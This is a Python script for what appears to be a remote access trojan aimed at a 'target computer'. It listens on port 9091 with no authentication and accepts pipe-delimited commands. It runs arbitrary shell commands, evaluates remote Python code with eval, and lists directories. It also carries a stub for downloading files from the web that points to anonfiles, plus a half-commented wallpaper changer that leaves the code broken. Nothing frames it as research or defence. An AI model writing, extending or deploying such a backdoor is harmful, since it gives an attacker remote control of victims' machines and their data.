#Imports
import ctypes
import os
import socket
import sys
import subprocess
from subprocess import PIPE, Popen

#Install libraries
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wget'])
import wget

#Settings
port = 9091

#CMDS
def help(args):
    try:
        output = "shellcmd - Launch CMD command on target computer   Example: shellcmd|echo A   ///   "
        output += "uploadfilewww - Download a file on target computer from web   Example: uploadfilewww|https://directlinktofile/text.txt   ///   "
        output += "osname - Prints type of system on target computer   ///   "
        output += "listdirectory - Lists folders and files inside desired directory on target computer   Example: listdirectory|D:   ///   "
        output += 'remexec - Remote execution of python code on target computer   Example: remexec|print("a")   ///   '
        #output += "changewallpaper - Change desktop wallpaper on target computer   Example: changewallpaper|D:/file.png   ///   "
        print(output)
    except:
        print("Error in help command???")
    return output


def shellcmd(args):
    try:
        cmd = args[1]
        output = subprocess.check_output(cmd, shell=True)
    except:
        print("Error in shellcmd (fix your windows shell command)")
        output = "Error in shellcmd (fix your windows shell command)"
    print(output)
    return output
    
def uploadfilewww(args):
    try:
        url = args[1]
        location = args[2]
        output = "Downloaded " + url + " to " + location
    except:
        print("Error in uploadfilewww (use anonfiles and copy download link)")
        output = "Error in uploadfilewww (use anonfiles and copy download link)"
    return output

def osname(args):
    import platform
    return platform.system()

def listdirectory(args):
    print("listing directories")
    try:
        dir = args[1]
        output = os.listdir(dir)
    except:
        print("Error in list directory")
        output = "Error in list directory"
    return output

def remexec(args):
    try:
        remcode = args[1]
        output = ""
        output = eval(remcode)
        output = eval(remcode)
    except:
        print("Error in remote exec (fix your python command)")
        output = "Error in remote exec (fix your python command)"
    print(str(output))
    return str(output)

#def changewallpaper(args):
    try:
        path = args[1]
        path = path.replace("/",r'\\')
        print(path)
        print(repr(path))
        SPI_SETDESKWALLPAPER = 20 
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, r'D:\\file.jpg', 3) 
        output = ("Wallpaper has been set to", path)
    except:
        print("Error in changewallpaper")
    return output

#Functions
#def setup():


def executecmd(args):
    cmd = args[0]
    print(cmd)
    targetFunc = globals()[str(cmd)]
    result = targetFunc(args)
    return result



#Main
def main():
    print("Server is active on 127.0.0.1:", port)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("", port))
        sock.listen(9999)
        while True:
            conn, addr = sock.accept()
            with conn:
                print('Connected by', addr)
                while True:
                    data = conn.recv(1024)
                    if not data: break
                    receivedCMD = repr(data)
                    receivedCMD = receivedCMD[2:-1]
                    CMDandArgs = receivedCMD.split("|")
                    print(CMDandArgs)
                    try:
                        cmdOut = executecmd(CMDandArgs)
                        print(cmdOut)
                        if(cmdOut != ""):
                            conn.sendall(str(cmdOut).encode("utf-8"))
                    except:
                        msg = "Command Error"
                        conn.sendall(msg.encode("utf-8"))
                        print("Command Error")
            
while True:
    print("Starting...")
    main()
    print("Server Closed or Crashed...")
    print("Restarting...")
